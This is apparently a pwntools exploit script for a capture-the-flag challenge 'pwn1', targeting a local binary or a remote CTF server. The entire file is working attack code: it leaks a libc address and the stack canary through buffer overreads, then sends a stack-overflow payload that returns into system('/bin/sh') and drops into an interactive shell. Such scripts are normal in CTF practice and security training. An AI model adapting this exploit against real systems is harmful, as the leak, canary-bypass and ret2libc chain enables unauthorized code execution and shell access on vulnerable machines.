from pwn import *
import sys

b = ELF("./pwn1")
l = ELF("./libc.so.6")

if len(sys.argv) == 1:
	p = process("./pwn1")
else:
	p = remote("icewall-ctf.kr", 24001)

p.recvuntil("PWN1 by DelspoN")

payload = "a"*3
p.sendline(payload)
p.recvuntil(payload+"\n")
leak = u32(p.recv(4))
libc = leak - (0xf7fc3d60 - 0xf7e11000) + 0x2000
log.info("leak   = 0x%x" % leak)
log.info("libc   = 0x%x" % libc)

p.recvuntil("continue? (y/n) : ")
p.send('y')

payload = "a"*128
p.sendline(payload)
p.recvuntil(payload)
canary = u32(p.recv(4)) - 0x0a
log.info("canary = 0x%x" % canary)

p.recvuntil("continue? (y/n) : ")
p.send('y')

system = libc + l.symbols['system']
binsh  = libc + next(l.search("/bin/sh"))#(0xf7f6ca0b-0xf7e11000)
log.info("system = 0x%x" % system)
log.info("binsh  = 0x%x" % binsh)
payload = "a"*128 + p32(canary) + p32(0) * 3 + p32(system) + p32(binsh)*2
p.sendline(payload)


p.recvuntil("continue? (y/n) : ")
p.sendline('n')

p.interactive()
